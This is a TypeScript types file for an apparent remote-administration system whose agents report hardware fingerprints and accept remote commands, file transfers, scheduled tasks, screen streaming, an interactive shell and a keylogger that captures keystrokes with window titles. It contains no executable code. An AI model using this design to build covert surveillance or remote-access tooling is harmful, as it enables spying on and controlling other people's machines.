// ===== Agent =====
export interface Agent {
  id: string;
  hostname: string;
  alias?: string;           // kullanıcının verdiği takma ad
  group?: string;           // grup etiketi (Lab-1, Sunucular, Masaüstü vb.)
  os: string;
  ip: string;
  username: string;
  machineId: string;       // /etc/machine-id veya registry MachineGuid
  mac: string;             // ilk non-internal NIC MAC adresi
  cpuModel: string;        // CPU model adı
  totalMemMB: number;      // toplam RAM (MB)
  fingerprint: string;     // kalıcı donanım parmak izi (sha256 veya UUID)
  firstSeen: string;
  lastSeen: string;
  isOnline: boolean;
}

// ===== Command =====
export interface Command {
  id: string;
  agentId: string;
  command: string;
  status: "pending" | "running" | "completed" | "error";
  output: string;
  sentAt: string;
  doneAt?: string;
}

// ===== File Manager =====
export interface FileEntry {
  name: string;
  path: string;
  isDirectory: boolean;
  size: number;          // bytes
  modified: string;      // ISO date
  permissions?: string;  // unix permissions e.g. "rwxr-xr-x"
}

export interface FileListRequest {
  requestId: string;
  path: string;
}

export interface FileListResponse {
  requestId: string;
  path: string;
  entries: FileEntry[];
  error?: string;
}

export interface FileDownloadRequest {
  requestId: string;
  path: string;
}

export interface FileDownloadResponse {
  requestId: string;
  path: string;
  fileName: string;
  data: string;       // base64 encoded
  size: number;
  error?: string;
}

export interface FileUploadRequest {
  requestId: string;
  path: string;        // full destination path including filename
  data: string;        // base64 encoded
}

export interface FileUploadResponse {
  requestId: string;
  path: string;
  success: boolean;
  error?: string;
}

export interface FileDeleteRequest {
  requestId: string;
  path: string;
}

export interface FileDeleteResponse {
  requestId: string;
  path: string;
  success: boolean;
  error?: string;
}

export interface FileMoveRequest {
  requestId: string;
  source: string;
  destination: string;
}

export interface FileMoveResponse {
  requestId: string;
  source: string;
  destination: string;
  success: boolean;
  error?: string;
}

export interface FileCopyRequest {
  requestId: string;
  source: string;
  destination: string;
}

export interface FileCopyResponse {
  requestId: string;
  source: string;
  destination: string;
  success: boolean;
  error?: string;
}

// ===== System Metrics =====
export interface SystemMetrics {
  timestamp: string;
  cpuPercent: number;       // 0-100
  memUsedMB: number;        // used RAM in MB
  memTotalMB: number;       // total RAM in MB
  memPercent: number;        // 0-100
  diskUsedGB: number;       // used disk in GB
  diskTotalGB: number;      // total disk in GB
  diskPercent: number;       // 0-100
  gpuPercent?: number;      // 0-100 (optional, if GPU available)
  gpuMemPercent?: number;   // 0-100 (optional)
  gpuName?: string;         // GPU name (optional)
  uptime: number;           // seconds
  loadAvg?: number[];       // 1, 5, 15 min load averages (Linux only)
}

// ===== WebSocket Messages =====
export type WSMessage =
  | { type: "register"; data: RegisterData }
  | { type: "heartbeat"; agentId: string; data?: { metrics?: SystemMetrics } }
  | { type: "result"; agentId: string; data: ResultData }
  | { type: "registered"; agentId: string }
  | { type: "command"; agentId: string; data: CommandData }
  // File Manager messages
  | { type: "file_list"; agentId: string; data: FileListRequest }
  | { type: "file_list_result"; agentId: string; data: FileListResponse }
  | { type: "file_download"; agentId: string; data: FileDownloadRequest }
  | { type: "file_download_result"; agentId: string; data: FileDownloadResponse }
  | { type: "file_upload"; agentId: string; data: FileUploadRequest }
  | { type: "file_upload_result"; agentId: string; data: FileUploadResponse }
  | { type: "file_delete"; agentId: string; data: FileDeleteRequest }
  | { type: "file_delete_result"; agentId: string; data: FileDeleteResponse }
  | { type: "file_move"; agentId: string; data: FileMoveRequest }
  | { type: "file_move_result"; agentId: string; data: FileMoveResponse }
  | { type: "file_copy"; agentId: string; data: FileCopyRequest }
  | { type: "file_copy_result"; agentId: string; data: FileCopyResponse }
  // Keylogger
  | { type: "keylog_start"; agentId: string }
  | { type: "keylog_stop"; agentId: string }
  | { type: "keylog_started"; agentId: string }
  | { type: "keylog_stopped"; agentId: string }
  | { type: "keylog_data"; agentId: string; data: { events: KeyEvent[] } }
  | { type: "keylog_error"; agentId: string; data: { error: string } }
  // Screen streaming (screenshot-based)
  | { type: "screen_start"; agentId: string; data?: { fps?: number; quality?: number } }
  | { type: "screen_stop"; agentId: string }
  | { type: "screen_started"; agentId: string; data: { fps: number; method: string } }
  | { type: "screen_stopped"; agentId: string }
  | { type: "screen_frame"; agentId: string; data: { frame: string; ts: number } }
  | { type: "screen_error"; agentId: string; data: { error: string } }
  // Interactive terminal (PTY)
  | { type: "pty_start"; agentId: string; data?: { rows?: number; cols?: number } }
  | { type: "pty_stop"; agentId: string }
  | { type: "pty_input"; agentId: string; data: { input: string } }
  | { type: "pty_output"; agentId: string; data: { output: string } }
  | { type: "pty_resize"; agentId: string; data: { rows: number; cols: number } }
  | { type: "pty_started"; agentId: string; data: { shell: string; rows: number; cols: number } }
  | { type: "pty_stopped"; agentId: string }
  | { type: "pty_exit"; agentId: string; data: { reason: string; code?: number } }
  | { type: "pty_error"; agentId: string; data: { error: string } };

// ===== Keylogger =====
export interface KeyEvent {
  key: string;
  ts: number;        // unix timestamp ms
  window?: string;   // active window title
}

export interface RegisterData {
  hostname: string;
  os: string;
  username: string;
  ip: string;
  machineId: string;
  mac: string;
  cpuModel: string;
  totalMemMB: number;
  fingerprint: string;
}

export interface CommandData {
  commandId: string;
  command: string;
}

export interface ResultData {
  commandId: string;
  output: string;
  error?: string;
}

// ===== Scheduled Tasks =====
export interface ScheduledTask {
  id: string;
  name: string;
  command: string;
  cronExpr?: string;            // "0 3 * * *"
  intervalSeconds?: number;     // 3600
  targetType: "agent" | "group";
  targetId: string;             // agent ID or group name
  enabled: boolean;
  createdBy?: string;
  createdAt: string;
  updatedAt: string;
  lastRunAt?: string;
  nextRunAt?: string;
  runCount: number;
}

export interface TaskRun {
  id: string;
  taskId: string;
  startedAt: string;
  completedAt?: string;
  status: "pending" | "running" | "completed" | "error" | "skipped";
  targetAgentId?: string;
  commandId?: string;
  output?: string;
  error?: string;
}
